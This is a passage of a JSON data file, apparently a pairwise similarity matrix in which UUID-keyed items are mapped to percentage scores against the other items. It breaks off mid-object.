      "bef94cf5-595b-4cf6-82e6-d592b4a4eb29": 98.9,
      "587bd561-be86-44bf-996b-7dc9cb1dad00": 99.55,
      "6292d7a7-595c-4a52-b04f-8762c556bb27": 84.31,
      "14e8341c-52c1-43c5-91fc-400bc3dfb1d0": 1.87,
      "79de8f59-1485-4eed-8993-a02d16e9123b": 82.93,
      "1b3a2695-6451-416e-ba6b-b43194c9e679": 66.31,
      "74230f56-9a24-4a52-aa87-8bf7f1714c95": 78.59,
      "fec95837-3bbe-4bc4-b28d-a06582d18b4f": 99.86,
      "d85f3087-0f00-462d-8961-9f70a06ab096": 99.76,
      "6e072a16-d906-446f-b860-7f65482e8afc": 99.82,
      "e7f35b38-759a-4345-8da0-0fb9627b0070": 46.37,
      "44f366f9-a0fb-448b-b031-ab839c5349b5": 99.79,
      "4a792103-b99e-4af0-8524-7040ffa10b82": 99.46,
      "6f2bab4f-c61c-4ccc-a403-45470c7132b1": 99.46,
      "ca227298-dcc5-4af4-9171-a50618c2209c": 99.61,
      "f14c638d-60f5-485e-a303-fff708acd164": 73.85,
      "747a50b4-5a6f-48fb-b977-b2b85b31d664": 99.83,
      "d92b439e-d752-48db-8f52-a0f3d0db0d34": 99.55,
      "098662bd-21f6-4c26-afb8-31ddd9852485": 99.64,
      "0a445a1e-dc97-4fc7-b6c6-10e537381e74": 99.26,
      "235da0b4-d052-4b85-bfee-e075f767a0b0": 99.64,
      "65de9d63-a252-424b-9399-aedb43b92a53": 99.22,
      "0103d700-ab0b-4c2f-8043-6dac445c84fa": 7.72,
      "4db0ad68-f3bb-4d54-9219-f27aea042d96": 99.22,
      "17a2d73d-9f8d-4f33-9a3a-f801735298a1": 99.59,
      "05efbd7d-8d96-45fd-b908-f255763e70bd": 6.56,
      "8645a3c8-b552-480d-b88e-90258459cc4d": 99.71,
      "3f3755b9-98bb-4ba8-ab69-4e3d198e38cc": 99.38
    },
    "d85f3087-0f00-462d-8961-9f70a06ab096": {
      "bef94cf5-595b-4cf6-82e6-d592b4a4eb29": 98.93,
      "587bd561-be86-44bf-996b-7dc9cb1dad00": 99.43,
      "6292d7a7-595c-4a52-b04f-8762c556bb27": 84.18,
      "14e8341c-52c1-43c5-91fc-400bc3dfb1d0": 1.87,
      "79de8f59-1485-4eed-8993-a02d16e9123b": 82.26,
      "1b3a2695-6451-416e-ba6b-b43194c9e679": 67.53,
      "74230f56-9a24-4a52-aa87-8bf7f1714c95": 78.48,
      "fec95837-3bbe-4bc4-b28d-a06582d18b4f": 99.64,
      "0e85fb68-de71-4979-8b8f-80d509029455": 99.76,
      "6e072a16-d906-446f-b860-7f65482e8afc": 99.19,
      "e7f35b38-759a-4345-8da0-0fb9627b0070": 47.51,
      "44f366f9-a0fb-448b-b031-ab839c5349b5": 99.5,
      "4a792103-b99e-4af0-8524-7040ffa10b82": 99.7,
      "6f2bab4f-c61c-4ccc-a403-45470c7132b1": 98.92,
      "ca227298-dcc5-4af4-9171-a50618c2209c": 99.19,
      "f14c638d-60f5-485e-a303-fff708acd164": 73.44,
      "747a50b4-5a6f-48fb-b977-b2b85b31d664": 99.67,
      "d92b439e-d752-48db-8f52-a0f3d0db0d34": 99.47,
      "098662bd-21f6-4c26-afb8-31ddd9852485": 99.73,
      "0a445a1e-dc97-4fc7-b6c6-10e537381e74": 99.47,
      "235da0b4-d052-4b85-bfee-e075f767a0b0": 99.58,
      "65de9d63-a252-424b-9399-aedb43b92a53": 99.02,
      "0103d700-ab0b-4c2f-8043-6dac445c84fa": 7.39,
      "4db0ad68-f3bb-4d54-9219-f27aea042d96": 99.34,
      "17a2d73d-9f8d-4f33-9a3a-f801735298a1": 99.26,
      "05efbd7d-8d96-45fd-b908-f255763e70bd": 5.97,
      "8645a3c8-b552-480d-b88e-90258459cc4d": 99.77,
      "3f3755b9-98bb-4ba8-ab69-4e3d198e38cc": 99.29
    },
    "6e072a16-d906-446f-b860-7f65482e8afc": {
      "bef94cf5-595b-4cf6-82e6-d592b4a4eb29": 99.47,
      "587bd561-be86-44bf-996b-7dc9cb1dad00": 99.38,
      "6292d7a7-595c-4a52-b04f-8762c556bb27": 85.13,
      "14e8341c-52c1-43c5-91fc-400bc3dfb1d0": 1.87,
      "79de8f59-1485-4eed-8993-a02d16e9123b": 82.93,
      "1b3a2695-6451-416e-ba6b-b43194c9e679": 67.96,
      "74230f56-9a24-4a52-aa87-8bf7f1714c95": 79.16,
      "fec95837-3bbe-4bc4-b28d-a06582d18b4f": 99.7,
      "0e85fb68-de71-4979-8b8f-80d509029455": 99.82,
      "d85f3087-0f00-462d-8961-9f70a06ab096": 99.19,
      "e7f35b38-759a-4345-8da0-0fb9627b0070": 46.64,
      "44f366f9-a0fb-448b-b031-ab839c5349b5": 99.55,
      "4a792103-b99e-4af0-8524-7040ffa10b82": 98.81,
      "6f2bab4f-c61c-4ccc-a403-45470c7132b1": 99.59,
      "ca227298-dcc5-4af4-9171-a50618c2209c": 99.5,
      "f14c638d-60f5-485e-a303-fff708acd164": 75.25,
      "747a50b4-5a6f-48fb-b977-b2b85b31d664": 99.58,
      "d92b439e-d752-48db-8f52-a0f3d0db0d34": 99.38,
      "098662bd-21f6-4c26-afb8-31ddd9852485": 99.7,
      "0a445a1e-dc97-4fc7-b6c6-10e537381e74": 99.49,
      "235da0b4-d052-4b85-bfee-e075f767a0b0": 99.71,
      "65de9d63-a252-424b-9399-aedb43b92a53": 99.4,
      "0103d700-ab0b-4c2f-8043-6dac445c84fa": 6.07,
      "4db0ad68-f3bb-4d54-9219-f27aea042d96": 98.98,
      "17a2d73d-9f8d-4f33-9a3a-f801735298a1": 99.71,
      "05efbd7d-8d96-45fd-b908-f255763e70bd": 3.58,
      "8645a3c8-b552-480d-b88e-90258459cc4d": 99.1,
      "3f3755b9-98bb-4ba8-ab69-4e3d198e38cc": 99.34
    },
    "e7f35b38-759a-4345-8da0-0fb9627b0070": {
      "bef94cf5-595b-4cf6-82e6-d592b4a4eb29": 44.58,
      "587bd561-be86-44bf-996b-7dc9cb1dad00": 46.91,
      "6292d7a7-595c-4a52-b04f-8762c556bb27": 47.31,
      "14e8341c-52c1-43c5-91fc-400bc3dfb1d0": 4.24,
      "79de8f59-1485-4eed-8993-a02d16e9123b": 58.54,
      "1b3a2695-6451-416e-ba6b-b43194c9e679": 73.55,
      "74230f56-9a24-4a52-aa87-8bf7f1714c95": 49.59,
      "fec95837-3bbe-4bc4-b28d-a06582d18b4f": 45.18,
      "0e85fb68-de71-4979-8b8f-80d509029455": 46.37,
      "d85f3087-0f00-462d-8961-9f70a06ab096": 47.51,
      "6e072a16-d906-446f-b860-7f65482e8afc": 46.64,
      "44f366f9-a0fb-448b-b031-ab839c5349b5": 47.26,
      "4a792103-b99e-4af0-8524-7040ffa10b82": 46.89,
      "6f2bab4f-c61c-4ccc-a403-45470c7132b1": 44.83,
      "ca227298-dcc5-4af4-9171-a50618c2209c": 46.86,
      "f14c638d-60f5-485e-a303-fff708acd164": 18.91,
      "747a50b4-5a6f-48fb-b977-b2b85b31d664": 45.87,
      "d92b439e-d752-48db-8f52-a0f3d0db0d34": 46.27,
      "098662bd-21f6-4c26-afb8-31ddd9852485": 46.0,
      "0a445a1e-dc97-4fc7-b6c6-10e537381e74": 45.82,
      "235da0b4-d052-4b85-bfee-e075f767a0b0": 47.06,
      "65de9d63-a252-424b-9399-aedb43b92a53": 46.0,
      "0103d700-ab0b-4c2f-8043-6dac445c84fa": 8.05,
      "4db0ad68-f3bb-4d54-9219-f27aea042d96": 45.62,
      "17a2d73d-9f8d-4f33-9a3a-f801735298a1": 47.04,
      "05efbd7d-8d96-45fd-b908-f255763e70bd": 29.24,
      "8645a3c8-b552-480d-b88e-90258459cc4d": 45.05,
      "3f3755b9-98bb-4ba8-ab69-4e3d198e38cc": 46.37
    },
    "44f366f9-a0fb-448b-b031-ab839c5349b5": {
      "bef94cf5-595b-4cf6-82e6-d592b4a4eb29": 99.14,
      "587bd561-be86-44bf-996b-7dc9cb1dad00": 99.52,
      "6292d7a7-595c-4a52-b04f-8762c556bb27": 84.67,
      "14e8341c-52c1-43c5-91fc-400bc3dfb1d0": 1.87,
      "79de8f59-1485-4eed-8993-a02d16e9123b": 82.77,
      "1b3a2695-6451-416e-ba6b-b43194c9e679": 67.15,
      "74230f56-9a24-4a52-aa87-8bf7f1714c95": 78.79,
      "fec95837-3bbe-4bc4-b28d-a06582d18b4f": 99.79,
      "0e85fb68-de71-4979-8b8f-80d509029455": 99.79,
      "d85f3087-0f00-462d-8961-9f70a06ab096": 99.5,
      "6e072a16-d906-446f-b860-7f65482e8afc": 99.55,
      "e7f35b38-759a-4345-8da0-0fb9627b0070": 47.26,
      "4a792103-b99e-4af0-8524-7040ffa10b82": 99.65,
      "6f2bab4f-c61c-4ccc-a403-45470c7132b1": 98.98,
      "ca227298-dcc5-4af4-9171-a50618c2209c": 99.59,
      "f14c638d-60f5-485e-a303-fff708acd164": 74.49,
      "747a50b4-5a6f-48fb-b977-b2b85b31d664": 99.65,
      "d92b439e-d752-48db-8f52-a0f3d0db0d34": 99.37,
      "098662bd-21f6-4c26-afb8-31ddd9852485": 99.5,
      "0a445a1e-dc97-4fc7-b6c6-10e537381e74": 99.56,
      "235da0b4-d052-4b85-bfee-e075f767a0b0": 99.5,
      "65de9d63-a252-424b-9399-aedb43b92a53": 99.31,
      "0103d700-ab0b-4c2f-8043-6dac445c84fa": 7.72,
      "4db0ad68-f3bb-4d54-9219-f27aea042d96": 99.31,
      "17a2d73d-9f8d-4f33-9a3a-f801735298a1": 99.55,
      "05efbd7d-8d96-45fd-b908-f255763e70bd": 6.56,
      "8645a3c8-b552-480d-b88e-90258459cc4d": 99.49,
      "3f3755b9-98bb-4ba8-ab69-4e3d198e38cc": 99.55
    },
    "4a792103-b99e-4af0-8524-7040ffa10b82": {
      "bef94cf5-595b-4cf6-82e6-d592b4a4eb29": 99.1,
      "587bd561-be86-44bf-996b-7dc9cb1dad00": 99.58,
      "6292d7a7-595c-4a52-b04f-8762c556bb27": 84.03,
      "14e8341c-52c1-43c5-91fc-400bc3dfb1d0": 1.87,
      "79de8f59-1485-4eed-8993-a02d16e9123b": 81.91,
      "1b3a2695-6451-416e-ba6b-b43194c9e679": 67.02,
      "74230f56-9a24-4a52-aa87-8bf7f1714c95": 77.79,
      "fec95837-3bbe-4bc4-b28d-a06582d18b4f": 99.38,
      "0e85fb68-de71-4979-8b8f-80d509029455": 99.46,
      "d85f3087-0f00-462d-8961-9f70a06ab096": 99.7,
      "6e072a16-d906-446f-b860-7f65482e8afc": 98.81,
      "e7f35b38-759a-4345-8da0-0fb9627b0070": 46.89,
      "44f366f9-a0fb-448b-b031-ab839c5349b5": 99.65,
      "6f2bab4f-c61c-4ccc-a403-45470c7132b1": 98.71,
      "ca227298-dcc5-4af4-9171-a50618c2209c": 98.98,
      "f14c638d-60f5-485e-a303-fff708acd164": 73.35,
      "747a50b4-5a6f-48fb-b977-b2b85b31d664": 99.59,
      "d92b439e-d752-48db-8f52-a0f3d0db0d34": 99.08,
      "098662bd-21f6-4c26-afb8-31ddd9852485": 99.22,
      "0a445a1e-dc97-4fc7-b6c6-10e537381e74": 99.56,
      "235da0b4-d052-4b85-bfee-e075f767a0b0": 99.68,
      "65de9d63-a252-424b-9399-aedb43b92a53": 99.16,
      "0103d700-ab0b-4c2f-8043-6dac445c84fa": 7.39,
      "4db0ad68-f3bb-4d54-9219-f27aea042d96": 99.46,
      "17a2d73d-9f8d-4f33-9a3a-f801735298a1": 99.56,
      "05efbd7d-8d96-45fd-b908-f255763e70bd": 5.97,
      "8645a3c8-b552-480d-b88e-90258459cc4d": 99.68,
      "3f3755b9-98bb-4ba8-ab69-4e3d198e38cc": 99.31
    },
    "6f2bab4f-c61c-4ccc-a403-45470c7132b1": {
      "bef94cf5-595b-4cf6-82e6-d592b4a4eb29": 99.71,
      "587bd561-be86-44bf-996b-7dc9cb1dad00": 99.65,
      "6292d7a7-595c-4a52-b04f-8762c556bb27": 84.0,
      "14e8341c-52c1-43c5-91fc-400bc3dfb1d0": 1.87,
      "79de8f59-1485-4eed-8993-a02d16e9123b": 82.31,
      "1b3a2695-6451-416e-ba6b-b43194c9e679": 66.64,
      "74230f56-9a24-4a52-aa87-8bf7f1714c95": 78.3,
      "fec95837-3bbe-4bc4-b28d-a06582d18b4f": 99.5,
      "0e85fb68-de71-4979-8b8f-80d509029455": 99.46,
      "d85f3087-0f00-462d-8961-9f70a06ab096": 98.92,
      "6e072a16-d906-446f-b860-7f65482e8afc": 99.59,
      "e7f35b38-759a-4345-8da0-0fb9627b0070": 44.83,
      "44f366f9-a0fb-448b-b031-ab839c5349b5": 98.98,
      "4a792103-b99e-4af0-8524-7040ffa10b82": 98.71,
      "ca227298-dcc5-4af4-9171-a50618c2209c": 99.43,
      "f14c638d-60f5-485e-a303-fff708acd164": 74.01,
      "747a50b4-5a6f-48fb-b977-b2b85b31d664": 99.67,
      "d92b439e-d752-48db-8f52-a0f3d0db0d34": 99.46,
      "098662bd-21f6-4c26-afb8-31ddd9852485": 99.11,
      "0a445a1e-dc97-4fc7-b6c6-10e537381e74": 99.4,
      "235da0b4-d052-4b85-bfee-e075f767a0b0": 99.46,
      "65de9d63-a252-424b-9399-aedb43b92a53": 99.91,
      "0103d700-ab0b-4c2f-8043-6dac445c84fa": 6.07,
      "4db0ad68-f3bb-4d54-9219-f27aea042d96": 99.47,
      "17a2d73d-9f8d-4f33-9a3a-f801735298a1": 99.38,
      "05efbd7d-8d96-45fd-b908-f255763e70bd": 3.58,
      "8645a3c8-b552-480d-b88e-90258459cc4d": 99.29,
      "3f3755b9-98bb-4ba8-ab69-4e3d198e38cc": 99.31
    },
    "ca227298-dcc5-4af4-9171-a50618c2209c": {
      "bef94cf5-595b-4cf6-82e6-d592b4a4eb29": 99.2,
      "587bd561-be86-44bf-996b-7dc9cb1dad00": 99.55,
      "6292d7a7-595c-4a52-b04f-8762c556bb27": 84.11,
      "14e8341c-52c1-43c5-91fc-400bc3dfb1d0": 1.87,
      "79de8f59-1485-4eed-8993-a02d16e9123b": 82.55,
      "1b3a2695-6451-416e-ba6b-b43194c9e679": 67.0,
      "74230f56-9a24-4a52-aa87-8bf7f1714c95": 78.71,
      "fec95837-3bbe-4bc4-b28d-a06582d18b4f": 99.5,
      "0e85fb68-de71-4979-8b8f-80d509029455": 99.61,
      "d85f3087-0f00-462d-8961-9f70a06ab096": 99.19,
      "6e072a16-d906-446f-b860-7f65482e8afc": 99.5,
      "e7f35b38-759a-4345-8da0-0fb9627b0070": 46.86,
      "44f366f9-a0fb-448b-b031-ab839c5349b5": 99.59,
      "4a792103-b99e-4af0-8524-7040ffa10b82": 98.98,
      "6f2bab4f-c61c-4ccc-a403-45470c7132b1": 99.43,
      "f14c638d-60f5-485e-a303-fff708acd164": 73.79,
      "747a50b4-5a6f-48fb-b977-b2b85b31d664": 99.97,
      "d92b439e-d752-48db-8f52-a0f3d0db0d34": 99.62,
      "098662bd-21f6-4c26-afb8-31ddd9852485": 99.04,
      "0a445a1e-dc97-4fc7-b6c6-10e537381e74": 99.26,
      "235da0b4-d052-4b85-bfee-e075f767a0b0": 99.43,
      "65de9d63-a252-424b-9399-aedb43b92a53": 99.71,
      "0103d700-ab0b-4c2f-8043-6dac445c84fa": 7.72,
      "4db0ad68-f3bb-4d54-9219-f27aea042d96": 99.49,
      "17a2d73d-9f8d-4f33-9a3a-f801735298a1": 99.47,
      "05efbd7d-8d96-45fd-b908-f255763e70bd": 6.56,
      "8645a3c8-b552-480d-b88e-90258459cc4d": 99.52,
      "3f3755b9-98bb-4ba8-ab69-4e3d198e38cc": 99.28
    },
    "f14c638d-60f5-485e-a303-fff708acd164": {
      "bef94cf5-595b-4cf6-82e6-d592b4a4eb29": 73.79,
      "587bd561-be86-44bf-996b-7dc9cb1dad00": 74.49,
      "6292d7a7-595c-4a52-b04f-8762c556bb27": 84.63,
      "14e8341c-52c1-43c5-91fc-400bc3dfb1d0": 7.12,
      "79de8f59-1485-4eed-8993-a02d16e9123b": 80.37,
      "1b3a2695-6451-416e-ba6b-b43194c9e679": 25.18,
      "74230f56-9a24-4a52-aa87-8bf7f1714c95": 85.24,
      "fec95837-3bbe-4bc4-b28d-a06582d18b4f": 72.72,
      "0e85fb68-de71-4979-8b8f-80d509029455": 73.85,
      "d85f3087-0f00-462d-8961-9f70a06ab096": 73.44,
      "6e072a16-d906-446f-b860-7f65482e8afc": 75.25,
      "e7f35b38-759a-4345-8da0-0fb9627b0070": 18.91,
      "44f366f9-a0fb-448b-b031-ab839c5349b5": 74.49,
      "4a792103-b99e-4af0-8524-7040ffa10b82": 73.35,
      "6f2bab4f-c61c-4ccc-a403-45470c7132b1": 74.01,
      "ca227298-dcc5-4af4-9171-a50618c2209c": 73.79,
      "747a50b4-5a6f-48fb-b977-b2b85b31d664": 74.23,
      "d92b439e-d752-48db-8f52-a0f3d0db0d34": 74.55,
      "098662bd-21f6-4c26-afb8-31ddd9852485": 72.65,
      "0a445a1e-dc97-4fc7-b6c6-10e537381e74": 74.08,
      "235da0b4-d052-4b85-bfee-e075f767a0b0": 73.79,
      "65de9d63-a252-424b-9399-aedb43b92a53": 74.23,
      "0103d700-ab0b-4c2f-8043-6dac445c84fa": 7.85,
      "4db0ad68-f3bb-4d54-9219-f27aea042d96": 72.56,
      "17a2d73d-9f8d-4f33-9a3a-f801735298a1": 74.33,
      "05efbd7d-8d96-45fd-b908-f255763e70bd": 10.14,
      "8645a3c8-b552-480d-b88e-90258459cc4d": 73.03,
      "3f3755b9-98bb-4ba8-ab69-4e3d198e38cc": 74.64
    },
    "747a50b4-5a6f-48fb-b977-b2b85b31d664": {
      "bef94cf5-595b-4cf6-82e6-d592b4a4eb29": 99.01,
      "587bd561-be86-44bf-996b-7dc9cb1dad00": 99.55,
      "6292d7a7-595c-4a52-b04f-8762c556bb27": 84.63,
      "14e8341c-52c1-43c5-91fc-400bc3dfb1d0": 1.87,
      "79de8f59-1485-4eed-8993-a02d16e9123b": 82.48,
      "1b3a2695-6451-416e-ba6b-b43194c9e679": 67.28,
      "74230f56-9a24-4a52-aa87-8bf7f1714c95": 78.59,
      "fec95837-3bbe-4bc4-b28d-a06582d18b4f": 99.56,
      "0e85fb68-de71-4979-8b8f-80d509029455": 99.83,
      "d85f3087-0f00-462d-8961-9f70a06ab096": 99.67,
      "6e072a16-d906-446f-b860-7f65482e8afc": 99.58,
      "e7f35b38-759a-4345-8da0-0fb9627b0070": 45.87,
      "44f366f9-a0fb-448b-b031-ab839c5349b5": 99.65,
      "4a792103-b99e-4af0-8524-7040ffa10b82": 99.59,
      "6f2bab4f-c61c-4ccc-a403-45470c7132b1": 99.67,
      "ca227298-dcc5-4af4-9171-a50618c2209c": 99.97,
      "f14c638d-60f5-485e-a303-fff708acd164": 74.23,
      "d92b439e-d752-48db-8f52-a0f3d0db0d34": 99.86,
      "098662bd-21f6-4c26-afb8-31ddd9852485": 99.47,
      "0a445a1e-dc97-4fc7-b6c6-10e537381e74": 99.37,
      "235da0b4-d052-4b85-bfee-e075f767a0b0": 99.44,
      "65de9d63-a252-424b-9399-aedb43b92a53": 99.4,
      "0103d700-ab0b-4c2f-8043-6dac445c84fa": 7.72,
      "4db0ad68-f3bb-4d54-9219-f27aea042d96": 99.5,
      "17a2d73d-9f8d-4f33-9a3a-f801735298a1": 99.47,
      "05efbd7d-8d96-45fd-b908-f255763e70bd": 6.56,
      "8645a3c8-b552-480d-b88e-90258459cc4d": 99.65,
      "3f3755b9-98bb-4ba8-ab69-4e3d198e38cc": 99.43
    },
    "d92b439e-d752-48db-8f52-a0f3d0db0d34": {
      "bef94cf5-595b-4cf6-82e6-d592b4a4eb29": 98.98,
      "587bd561-be86-44bf-996b-7dc9cb1dad00": 99.5,
      "6292d7a7-595c-4a52-b04f-8762c556bb27": 84.13,
      "14e8341c-52c1-43c5-91fc-400bc3dfb1d0": 1.87,
      "79de8f59-1485-4eed-8993-a02d16e9123b": 81.95,
      "1b3a2695-6451-416e-ba6b-b43194c9e679": 65.98,
      "74230f56-9a24-4a52-aa87-8bf7f1714c95": 78.74,
      "fec95837-3bbe-4bc4-b28d-a06582d18b4f": 99.77,
      "0e85fb68-de71-4979-8b8f-80d509029455": 99.55,
      "d85f3087-0f00-462d-8961-9f70a06ab096": 99.47,
      "6e072a16-d906-446f-b860-7f65482e8afc": 99.38,
      "e7f35b38-759a-4345-8da0-0fb9627b0070": 46.27,
      "44f366f9-a0fb-448b-b031-ab839c5349b5": 99.37,
      "4a792103-b99e-4af0-8524-7040ffa10b82": 99.08,
      "6f2bab4f-c61c-4ccc-a403-45470c7132b1": 99.46,
      "ca227298-dcc5-4af4-9171-a50618c2209c": 99.62,
      "f14c638d-60f5-485e-a303-fff708acd164": 74.55,
      "747a50b4-5a6f-48fb-b977-b2b85b31d664": 99.86,
      "098662bd-21f6-4c26-afb8-31ddd9852485": 99.22,
      "0a445a1e-dc97-4fc7-b6c6-10e537381e74": 99.37,
      "235da0b4-d052-4b85-bfee-e075f767a0b0": 99.35,
      "65de9d63-a252-424b-9399-aedb43b92a53": 99.53,
      "0103d700-ab0b-4c2f-8043-6dac445c84fa": 7.72,
      "4db0ad68-f3bb-4d54-9219-f27aea042d96": 99.49,
      "17a2d73d-9f8d-4f33-9a3a-f801735298a1": 99.38,
      "05efbd7d-8d96-45fd-b908-f255763e70bd": 6.56,
      "8645a3c8-b552-480d-b88e-90258459cc4d": 99.34,
      "3f3755b9-98bb-4ba8-ab69-4e3d198e38cc": 99.46
    },
    "098662bd-21f6-4c26-afb8-31ddd9852485": {
      "bef94cf5-595b-4cf6-82e6-d592b4a4eb29": 99.11,
      "587bd561-be86-44bf-996b-7dc9cb1dad00": 99.31,
      "6292d7a7-595c-4a52-b04f-8762c556bb27": 83.96,
      "14e8341c-52c1-43c5-91fc-400bc3dfb1d0": 1.87,
      "79de8f59-1485-4eed-8993-a02d16e9123b": 82.48,
      "1b3a2695-6451-416e-ba6b-b43194c9e679": 67.15,
      "74230f56-9a24-4a52-aa87-8bf7f1714c95": 77.97,
      "fec95837-3bbe-4bc4-b28d-a06582d18b4f": 99.88,
      "0e85fb68-de71-4979-8b8f-80d509029455": 99.64,
      "d85f3087-0f00-462d-8961-9f70a06ab096": 99.73,
      "6e072a16-d906-446f-b860-7f65482e8afc": 99.7,
      "e7f35b38-759a-4345-8da0-0fb9627b0070": 46.0,
      "44f366f9-a0fb-448b-b031-ab839c5349b5": 99.5,
      "4a792103-b99e-4af0-8524-7040ffa10b82": 99.22,
      "6f2bab4f-c61c-4ccc-a403-45470c7132b1": 99.11,
      "ca227298-dcc5-4af4-9171-a50618c2209c": 99.04,
      "f14c638d-60f5-485e-a303-fff708acd164": 72.65,
      "747a50b4-5a6f-48fb-b977-b2b85b31d664": 99.47,
      "d92b439e-d752-48db-8f52-a0f3d0db0d34": 99.22,
      "0a445a1e-dc97-4fc7-b6c6-10e537381e74": 99.7,
      "235da0b4-d052-4b85-bfee-e075f767a0b0": 99.7,
      "65de9d63-a252-424b-9399-aedb43b92a53": 98.83,
      "0103d700-ab0b-4c2f-8043-6dac445c84fa": 4.09,
      "4db0ad68-f3bb-4d54-9219-f27aea042d96": 98.81,
      "17a2d73d-9f8d-4f33-9a3a-f801735298a1": 99.22,
      "05efbd7d-8d96-45fd-b908-f255763e70bd": 0,
      "8645a3c8-b552-480d-b88e-90258459cc4d": 99.32,
      "3f3755b9-98bb-4ba8-ab69-4e3d198e38cc": 99.1
    },
    "0a445a1e-dc97-4fc7-b6c6-10e537381e74": {
      "bef94cf5-595b-4cf6-82e6-d592b4a4eb29": 98.84,
      "587bd561-be86-44bf-996b-7dc9cb1dad00": 99.26,
      "6292d7a7-595c-4a52-b04f-8762c556bb27": 85.02,
      "14e8341c-52c1-43c5-91fc-400bc3dfb1d0": 1.87,
      "79de8f59-1485-4eed-8993-a02d16e9123b": 82.48,
      "1b3a2695-6451-416e-ba6b-b43194c9e679": 67.63,
      "74230f56-9a24-4a52-aa87-8bf7f1714c95": 79.36,
      "fec95837-3bbe-4bc4-b28d-a06582d18b4f": 99.58,
      "0e85fb68-de71-4979-8b8f-80d509029455": 99.26,
      "d85f3087-0f00-462d-8961-9f70a06ab096": 99.47,
      "6e072a16-d906-446f-b860-7f65482e8afc": 99.49,
      "e7f35b38-759a-4345-8da0-0fb9627b0070": 45.82,
      "44f366f9-a0fb-448b-b031-ab839c5349b5": 99.56,
      "4a792103-b99e-4af0-8524-7040ffa10b82": 99.56,
      "6f2bab4f-c61c-4ccc-a403-45470c7132b1": 99.4,
      "ca227298-dcc5-4af4-9171-a50618c2209c": 99.26,
      "f14c638d-60f5-485e-a303-fff708acd164": 74.08,
      "747a50b4-5a6f-48fb-b977-b2b85b31d664": 99.37,
      "d92b439e-d752-48db-8f52-a0f3d0db0d34": 99.37,
      "098662bd-21f6-4c26-afb8-31ddd9852485": 99.7,
      "235da0b4-d052-4b85-bfee-e075f767a0b0": 99.59,
      "65de9d63-a252-424b-9399-aedb43b92a53": 98.83,
      "0103d700-ab0b-4c2f-8043-6dac445c84fa": 4.09,
      "4db0ad68-f3bb-4d54-9219-f27aea042d96": 98.98,
      "17a2d73d-9f8d-4f33-9a3a-f801735298a1": 99.34,
      "05efbd7d-8d96-45fd-b908-f255763e70bd": 0,
      "8645a3c8-b552-480d-b88e-90258459cc4d": 99.43,
      "3f3755b9-98bb-4ba8-ab69-4e3d198e38cc": 98.98
    },
    "235da0b4-d052-4b85-bfee-e075f767a0b0": {
      "bef94cf5-595b-4cf6-82e6-d592b4a4eb29": 99.22,
      "587bd561-be86-44bf-996b-7dc9cb1dad00": 99.76,
      "6292d7a7-595c-4a52-b04f-8762c556bb27": 84.54,
      "14e8341c-52c1-43c5-91fc-400bc3dfb1d0": 1.87,
      "79de8f59-1485-4eed-8993-a02d16e9123b": 82.48,
      "1b3a2695-6451-416e-ba6b-b43194c9e679": 66.36,
      "74230f56-9a24-4a52-aa87-8bf7f1714c95": 78.53,
      "fec95837-3bbe-4bc4-b28d-a06582d18b4f": 99.76,
      "0e85fb68-de71-4979-8b8f-80d509029455": 99.64,
      "d85f3087-0f00-462d-8961-9f70a06ab096": 99.58,
      "6e072a16-d906-446f-b860-7f65482e8afc": 99.71,
      "e7f35b38-759a-4345-8da0-0fb9627b0070": 47.06,
      "44f366f9-a0fb-448b-b031-ab839c5349b5": 99.5,
      "4a792103-b99e-4af0-8524-7040ffa10b82": 99.68,
      "6f2bab4f-c61c-4ccc-a403-45470c7132b1": 99.46,
      "ca227298-dcc5-4af4-9171-a50618c2209c": 99.43,
      "f14c638d-60f5-485e-a303-fff708acd164": 73.79,
      "747a50b4-5a6f-48fb-b977-b2b85b31d664": 99.44,
      "d92b439e-d752-48db-8f52-a0f3d0db0d34": 99.35,
      "098662bd-21f6-4c26-afb8-31ddd9852485": 99.7,
      "0a445a1e-dc97-4fc7-b6c6-10e537381e74": 99.59,
      "65de9d63-a252-424b-9399-aedb43b92a53": 99.43,
      "0103d700-ab0b-4c2f-8043-6dac445c84fa": 6.07,
      "4db0ad68-f3bb-4d54-9219-f27aea042d96": 99.38,
      "17a2d73d-9f8d-4f33-9a3a-f801735298a1": 99.61,
      "05efbd7d-8d96-45fd-b908-f255763e70bd": 3.58,
      "8645a3c8-b552-480d-b88e-90258459cc4d": 99.4,
      "3f3755b9-98bb-4ba8-ab69-4e3d198e38cc": 99.71
    },
    "65de9d63-a252-424b-9399-aedb43b92a53": {
      "bef94cf5-595b-4cf6-82e6-d592b4a4eb29": 99.22,
      "587bd561-be86-44bf-996b-7dc9cb1dad00": 99.46,
      "6292d7a7-595c-4a52-b04f-8762c556bb27": 84.11,
      "14e8341c-52c1-43c5-91fc-400bc3dfb1d0": 1.87,
      "79de8f59-1485-4eed-8993-a02d16e9123b": 82.22,
      "1b3a2695-6451-416e-ba6b-b43194c9e679": 66.57,
      "74230f56-9a24-4a52-aa87-8bf7f1714c95": 78.43,
      "fec95837-3bbe-4bc4-b28d-a06582d18b4f": 99.49,
      "0e85fb68-de71-4979-8b8f-80d509029455": 99.22,
      "d85f3087-0f00-462d-8961-9f70a06ab096": 99.02,
      "6e072a16-d906-446f-b860-7f65482e8afc": 99.4,
      "e7f35b38-759a-4345-8da0-0fb9627b0070": 46.0,
      "44f366f9-a0fb-448b-b031-ab839c5349b5": 99.31,
      "4a792103-b99e-4af0-8524-7040ffa10b82": 99.16,
      "6f2bab4f-c61c-4ccc-a403-45470c7132b1": 99.91,
      "ca227298-dcc5-4af4-9171-a50618c2209c": 99.71,
      "f14c638d-60f5-485e-a303-fff708acd164": 74.23,
      "747a50b4-5a6f-48fb-b977-b2b85b31d664": 99.4,
      "d92b439e-d752-48db-8f52-a0f3d0db0d34": 99.53,
      "098662bd-21f6-4c26-afb8-31ddd9852485": 98.83,
      "0a445a1e-dc97-4fc7-b6c6-10e537381e74": 98.83,
      "235da0b4-d052-4b85-bfee-e075f767a0b0": 99.43,
      "0103d700-ab0b-4c2f-8043-6dac445c84fa": 7.72,
      "4db0ad68-f3bb-4d54-9219-f27aea042d96": 99.74,
      "17a2d73d-9f8d-4f33-9a3a-f801735298a1": 99.49,
      "05efbd7d-8d96-45fd-b908-f255763e70bd": 6.56,
      "8645a3c8-b552-480d-b88e-90258459cc4d": 99.5,
      "3f3755b9-98bb-4ba8-ab69-4e3d198e38cc": 99.55
    },
    "0103d700-ab0b-4c2f-8043-6dac445c84fa": {
      "bef94cf5-595b-4cf6-82e6-d592b4a4eb29": 4.09,
      "587bd561-be86-44bf-996b-7dc9cb1dad00": 7.72,
      "6292d7a7-595c-4a52-b04f-8762c556bb27": 7.72,
